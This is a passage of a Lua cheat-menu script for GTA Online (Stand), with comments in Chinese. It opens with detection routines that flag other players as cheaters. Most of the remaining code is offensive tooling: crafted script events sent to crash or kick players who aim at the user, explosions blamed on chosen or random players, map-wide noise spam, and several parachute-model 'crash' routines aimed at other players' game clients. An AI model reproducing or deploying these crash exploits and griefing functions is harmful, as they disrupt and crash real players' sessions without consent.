        for i, interior in ipairs(interior_stuff) do
            if (players.is_godmode(pid) or not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(ped)) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) == 99 and get_interior_player_is_in(pid) == interior then
                util.draw_debug_text(players.get_name(pid) .. "是无敌,很有可能是作弊者")
                break
            end
        end
    end 
end
--车辆无敌检测
function cargod_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY._GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) == 99 and get_interior_player_is_in(pid) == interior then
                    util.draw_debug_text(players.get_name(pid) .. "载具处于无敌模式")
                    break
                end
            end
        end
    end 
end
--未发布载具检测
function unreleased_car_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(unreleased_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(pid) .. "正在驾驶未发布的车辆")
            end
        end
    end
end
--无法获得武器检测
function cantgetweapon_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for i, hash in ipairs(modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and WEAPON.IS_PED_ARMED(ped, 7) then
                util.draw_debug_text(players.get_name(pid) .. "正在使用无法获得武器")
                break
            end
        end
    end
end
--无法获得载具检测
function cantgetvar_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(modded_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(pid) .. " 正在驾驶无法获得的载具,很有可能是作弊者")
                break
            end
        end
    end
end
--室内使用武器检测
function usingweapon_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        if players.is_in_interior(pid) and WEAPON.IS_PED_ARMED(player, 7) then
            util.draw_debug_text(players.get_name(pid) .. " 正在室内使用武器,极大可能是作弊者")
            break
        end
    end
end
--超级驾驶检测
function supercar_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        if class ~= 15 and class ~= 16 and veh_speed >= 180 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1) and (players.get_vehicle_model(pid) ~= util.joaat("oppressor") or players.get_vehicle_model(pid) ~= util.joaat("oppressor2")) then
            gtoast(players.get_name(pid) .. " 正在使用超级驾驶")
            break
        end
    end
end
--超级跑检测
function superrun_detection()
    for _, pid in ipairs(players.list(true, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local ped_speed = (ENTITY.GET_ENTITY_SPEED(ped)* 2.236936)
        if not util.is_session_transition_active() and get_interior_player_is_in(pid) == 0 and get_transition_state(pid) ~= 0 
        and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_IN_ANY_VEHICLE(ped, false)
        and not TASK.IS_PED_STILL(ped) and not PED.IS_PED_JUMPING(ped) and not ENTITY.IS_ENTITY_IN_AIR(ped) and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) <= 300.0 and ped_speed > 25 then -- fastest run speed is about 18ish mph but using 25 to give it some headroom to prevent false positives
            gtoast(players.get_name(pid) .. " 是超级跑")
            break
        end
    end
end
--观看检测
function lookingyou_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        for i, interior in ipairs(interior_stuff) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            if not util.is_session_transition_active() and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior
            and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
                if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_cam_pos(pid)) < 15.0 and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 20.0 then
                    gtoast(players.get_name(pid) .. " 正在观看你")
                    break
                end
            end
        end
    end
end
--传送检测
function tp_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        if not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
            local oldpos = players.get_position(pid)
            wait(1000)
            local currentpos = players.get_position(pid)
            for i, interior in ipairs(interior_stuff) do
                if v3.distance(oldpos, currentpos) > 500 and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
                and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior and PLAYER.IS_PLAYER_PLAYING(pid) and players.exists(pid) then
                    gtoast(players.get_name(pid) .. " 刚刚进行了传送")
                end
            end
        end
    end
end
function roundDecimals(float, decimals)
    decimals = 10 ^ decimals
    return math.floor(float * decimals) / decimals
end
markedPlayers = {}
otrBlipColour = 58
chatSpamSettings = {
    enabled = false,
    ignoreTeam = true,
    identicalMessages = 5,
}
--天基炮检测
function orbdection()
    local playerList = players.list(false, true, true)
    for i = 1, #playerList do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerList[i])
        if TASK.GET_IS_TASK_ACTIVE(ped, 135) and ENTITY.GET_ENTITY_SPEED(ped) == 0 then
            local pos = NETWORK._NETWORK_GET_PLAYER_COORDS(playerList[i])
            for j = 1, #orbitalTableCords do
                if roundDecimals(pos.x, 1) == roundDecimals(orbitalTableCords[j].x, 1) and roundDecimals(pos.y, 1) == roundDecimals(orbitalTableCords[j].y, 1) and roundDecimals(pos.z, 1) == roundDecimals(orbitalTableCords[j].z, 1) then
                    gtoast(players.get_name(playerList[i]) ..' '.. '正在使用天基炮')
                end
            end
        end
    end
end
karma = {}
whitelistGroups = {user = true, friends = true, strangers  = true}
whitelistListTable = {}
whitelistedName = false
function getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
    playerList = players.list(whitelistGroups.user, whitelistGroups.friends, whitelistGroups.strangers)
    notWhitelisted = {}
    for i = 1, #playerList do
        if not whitelistListTable[playerList[i]] and not (players.get_name(playerList[i]) == whitelistedName) then
            notWhitelisted[#notWhitelisted + 1] = playerList[i]
        end
    end
    return notWhitelisted
end
function isAnyPlayerTargetingEntity(playerPed)
    local playerList = getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
    for k, playerPid in pairs(playerList) do
        if PLAYER.IS_PLAYER_TARGETTING_ENTITY(playerPid, playerPed) or PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(playerPid, playerPed) then
            karma[playerPed] = {
                pid = playerPid,
                ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerPid)
            }
            return true
        end
    end
    karma[playerPed] = nil
    return false
end
function playerIsTargetingEntity(playerPed)
    local playerList = getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
    for k, playerPid in pairs(playerList) do
        if PLAYER.IS_PLAYER_TARGETTING_ENTITY(playerPid, playerPed) or PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(playerPid, playerPed) then
            karma[playerPed] = {
                pid = playerPid,
                ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerPid)
            }
            return true
        end
    end
    karma[playerPed] = nil
    return false
end
function get_spawn_state(pid)
    return memory.read_int(memory.script_global(((2657589 + 1) + (pid * 466)) + 232))
end
function sendscriptcrash()
    local userPed = players.user_ped()
    if playerIsTargetingEntity(userPed) and karma[userPed] then
        local karmaPid = karma[userPed].pid
        util.trigger_script_event(1 << karmaPid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        util.trigger_script_event(1 << karmaPid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        util.trigger_script_event(1 << karmaPid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        util.trigger_script_event(1 << karmaPid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        util.trigger_script_event(1 << karmaPid, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
    end
end
function sendgobreach()
    local userPed = players.user_ped()
    if playerIsTargetingEntity(userPed) and karma[userPed] then
        local karmaPid = karma[userPed].pid
        util.trigger_script_event(1 << karmaPid, {-93722397 ,1, 0, 0, 4,0,karmaPid, karmaPid})
    end
end
--[[Player
function GTPlayer(ped, loop, expSettings)
    local TTPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TTPos = ENTITY.GET_ENTITY_COORDS(TTPed, true)
            local spped = PLAYER.PLAYER_PED_ID()
            local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
            SelfPlayerPos.x = SelfPlayerPos.x + 10
            TTPos.x = TTPos.x + 10
            local carc = CreateObject(util.joaat("apa_prop_flag_china"), TTPos, ENTITY.GET_ENTITY_HEADING(spped), true)
            local carcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
            local pedc = CreatePed(26, util.joaat("A_C_HEN"), TTPos, 0)
            local pedcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
            local ropec = PHYSICS.ADD_ROPE(TTPos.x, TTPos.y, TTPos.z, 0, 0, 0, 1, 1, 0.00300000000000000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, 0)
            PHYSICS.ATTACH_ENTITIES_TO_ROPE(ropec,carc,pedc,carcPos.x, carcPos.y, carcPos.z ,pedcPos.x, pedcPos.y, pedcPos.z,2, false, false, 0, 0, "Center","Center")
            wait(3500)
            PHYSICS.DELETE_CHILD_ROPE(ropec)
            entities.delete_by_handle(pedc)
end
function sendallplayercrash()
    local userPed = players.user_ped()
    if playerIsTargetingEntity(userPed) and karma[userPed] then
        GTPlayer(karma[userPed].ped, true, expSettings)
    end
end]]
function explosion(pos, expSettings)
    if expSettings.currentFx then
        if expSettings.currentFx.exp then
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, expSettings.currentFx.exp, 10, expSettings.audible, true, 0, expSettings.noDamage)
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 1, 10, false, true, expSettings.camShake, expSettings.noDamage)
        else
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 1, 10, false, true, expSettings.camShake, expSettings.noDamage)
        end
        if not expSettings.invisible then
            addFx(pos, expSettings.currentFx, expSettings.colour)
        end
    else
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, expSettings.expType, 10, expSettings.audible, expSettings.invisible, expSettings.camShake, expSettings.noDamage)
    end
end
JS_tbls = {}
    do
        JS_tbls.alphaPoints = {0, 87, 159, 207, 255}
    end
    expLoopDelay = New.delay(250, 0, 0)
    JS_tbls.effects = {
        ['Clown Explosion'] = {
            asset  	= 'scr_rcbarry2',
            name	= 'scr_exp_clown',
            colour 	= false,
            exp     = 31,
        },
        ['Clown Appears'] = {
            asset	= 'scr_rcbarry2',
            name 	= 'scr_clown_appears',
            colour  = false,
            exp     = 71,
        },
        ['FW Trailburst'] = {
            asset 	= 'scr_rcpaparazzo1',
            name 	= 'scr_mich4_firework_trailburst_spawn',
            colour 	= true,
            exp     = 66,
        },
        ['FW Starburst'] = {
            asset	= 'scr_indep_fireworks',
            name	= 'scr_indep_firework_starburst',
            colour 	= true,
        },
        ['FW Fountain'] = {
            asset 	= 'scr_indep_fireworks',
            name	= 'scr_indep_firework_fountain',
            colour 	= true,
        },
        ['Alien Disintegration'] = {
            asset	= 'scr_rcbarry1',
            name 	= 'scr_alien_disintegrate',
            colour 	= false,
            exp     = 3,
        },
        ['Clown Flowers'] = {
            asset	= 'scr_rcbarry2',
            name	= 'scr_clown_bul',
            colour 	= false,
        },
        ['FW Ground Burst'] = {
            asset 	= 'proj_indep_firework',
            name	= 'scr_indep_firework_grd_burst',
            colour 	= false,
            exp     = 25,
        }
    }
local expSettings = {
    camShake = 0,
    invisible = false,
    audible = true,
    noDamage = false,
    owned = false,
    blamed = false,
    blamedPlayer = false,
    expType = 0,
    -- stuff for fx explosions
    currentFx = JS_tbls.effects['Clown_Explosion'],
    colour = New.colour(255, 0, 255)
}
function explodePlayer(ped, loop, expSettings)
    pos = ENTITY.GET_ENTITY_COORDS(ped)
    -- if any blame is enabled this decides who should be blamed
    blamedPlayer = PLAYER.PLAYER_PED_ID()
    if expSettings.blamedPlayer and expSettings.blamed then
        blamedPlayer = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(expSettings.blamedPlayer)
    elseif expSettings.blamed then
        playerList = players.list(true, true, true)
        blamedPlayer = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerList[math.random(1, #playerList)])
    end
    if not loop and PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
        for i = 0, 50, 1 do -- 50 explosions to account for most armored vehicles
            if expSettings.owned or expSettings.blamed then
                ownedExplosion(blamedPlayer, pos, expSettings)
            else
                explosion(pos, expSettings)
            end
            wait(10)
        end
    elseif expSettings.owned or expSettings.blamed then
        ownedExplosion(blamedPlayer, pos, expSettings)
    else
        explosion(pos, expSettings)
    end
    wait(10)
end
function getTotalDelay(delayTable)
    return (delayTable.ms + (delayTable.s * 1000) + (delayTable.min * 1000 * 60))
end
function bulletaimkarma()
    local userPed = players.user_ped()
    if isAnyPlayerTargetingEntity(userPed) and karma[userPed] then
        local pos = ENTITY.GET_ENTITY_COORDS(karma[userPed].ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z + 0.1, 100, true, 100416529,
            userPed, true, false, 100.0)
        wait(getTotalDelay(expLoopDelay))
    end
end
function expaimkarma()
    local userPed = players.user_ped()
    if isAnyPlayerTargetingEntity(userPed) and karma[userPed] then
        explodePlayer(karma[userPed].ped, true, expSettings)
    end
end
function godaimkarma()
    local userPed = players.user_ped()
    if isAnyPlayerTargetingEntity(userPed) and karma[userPed] and players.is_godmode(karma[userPed].pid) then
        local karmaPid = karma[userPed].pid
        util.trigger_script_event(1 << karmaPid, {-1388926377, karmaPid, -1762807505, math.random(0, 9999)})
    end
end
function fangkongjingbao()
    local pos, exp_pos = v3(), v3()
    local Audio_POS = {v3(-73.31681060791, -820.26013183594, 326.17517089844), v3(2784.536, 5994.213, 354.275),
                       v3(-983.292, -2636.995, 89.524), v3(1747.518, 4814.711, 41.666), v3(1625.209, -76.936, 166.651),
                       v3(751.179, 1245.13, 353.832), v3(-1644.193, -1114.271, 13.029), v3(462.795, 5602.036, 781.400),
                       v3(-125.284, 6204.561, 40.164), v3(2099.765, 1766.219, 102.698)}
    for i = 1, #Audio_POS do
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z,
            "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
        pos.z = 2000.00
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z,
            "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
        pos.z = -2000.00
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z,
            "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
        for pid = 0, 31 do
            local pos = NETWORK._NETWORK_GET_PLAYER_COORDS(pid)
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", pos.x, pos.y, pos.z,
                "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
        end
    end
end
-- 噪音
function zaoyin()
    -- {"Bed", "WastedSounds"}
    local pos = v3()
    local Audio_POS = {v3(-73.31681060791, -820.26013183594, 326.17517089844), v3(2784.536, 5994.213, 354.275),
                       v3(-983.292, -2636.995, 89.524), v3(1747.518, 4814.711, 41.666), v3(1625.209, -76.936, 166.651),
                       v3(751.179, 1245.13, 353.832), v3(-1644.193, -1114.271, 13.029), v3(462.795, 5602.036, 781.400),
                       v3(-125.284, 6204.561, 40.164), v3(2099.765, 1766.219, 102.698)}
    for i = 1, #Audio_POS do
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true,
            999999999, true)
        pos.z = 2000.00
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true,
            999999999, true)
        pos.z = -2000.00
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true,
            999999999, true)
        for pid = 0, 31 do
            local pos = NETWORK._NETWORK_GET_PLAYER_COORDS(pid)
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", pos.x, pos.y, pos.z, "WastedSounds", true, 999999999, true)
        end
    end
end
-- 爆炸圈
function explosion_circle(ped, angle, radius)
    local ped_coords = ENTITY.GET_ENTITY_COORDS(ped)
    local offset_x = ped_coords.x
    local offset_y = ped_coords.y
    local x = offset_x + radius * math.cos(angle)
    local y = offset_y + radius * math.sin(angle)
    FIRE.ADD_EXPLOSION(x, y, ped_coords.z, 4, 1, true, false, 0)
end
-- 载具伞崩全局
function carcrashv1()
    local spped = PLAYER.PLAYER_PED_ID()
    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    for i = 1, 20 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
        wait(200)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 1381105889)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        wait(200)
        entities.delete_by_handle(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
end
-- 人物伞崩
function personlcrashv1()
    local spped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    for n = 0, 5 do
        local object_hash = util.joaat("prop_logpile_06b")
        STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            wait()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, 0, 0, 500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(spped, 0xFBAB5776, 1000, false)
        wait(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(spped)
        end
        wait(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
        local object_hash2 = util.joaat("prop_beach_parasol_03")
        STREAMING.REQUEST_MODEL(object_hash2)
        while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
            wait()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(spped, 0xFBAB5776, 1000, false)
        wait(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(spped)
        end
        wait(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
end
function personalcrashv2()
    for n = 0, 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1381105889
        STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            wait()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        wait(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        wait(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 720581693
        STREAMING.REQUEST_MODEL(bush_hash)
        while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
            wait()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        wait(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        wait(1000)
        menu.trigger_commands("tplsia")
    end
end
function personalcrashv3()
    local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    for n = 0, 3 do
        local object_hash = util.joaat("v_ilev_light_wardrobe_face")
        STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            wait()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0, 0, 500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        wait(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        wait(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z,
            false, true, true)
        local object_hash2 = util.joaat("v_ilev_light_wardrobe_face")
        STREAMING.REQUEST_MODEL(object_hash2)
        while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
            wait()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        wait(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        wait(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z,
            false, true, true)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z,
        false, true, true)
    wait(500)
end
function personalcrashv4()
    local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    for n = 0, 3 do
        local object_hash = util.joaat("prop_mk_num_6")
        STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            wait()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0, 0, 500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        wait(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        wait(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z,
            false, true, true)
        local object_hash2 = util.joaat("prop_beach_parasol_03")
        STREAMING.REQUEST_MODEL(object_hash2)
        while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
            wait()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        wait(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        wait(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z,
            false, true, true)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z,
        false, true, true)
end
function personalcrashv5()
    for n = 0, 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1117917059
        STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            wait()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        wait(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        wait(1000)
        menu.trigger_commands("tplsia")
        bush_hash = -908104950
        STREAMING.REQUEST_MODEL(bush_hash)
        while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
            wait()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        wait(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        wait(1000)
        menu.trigger_commands("tplsia")
    end
end
function rlengzhan()
    for n = 0, 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1117917059
        STREAMING.REQUEST_MODEL(object_hash)
        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
            wait()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        wait(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        wait(1000)
        menu.trigger_commands("tplsia")
        bush_hash = -908104950
        STREAMING.REQUEST_MODEL(bush_hash)
        while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
            wait()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0, 0, 500, 0, 0, 1)
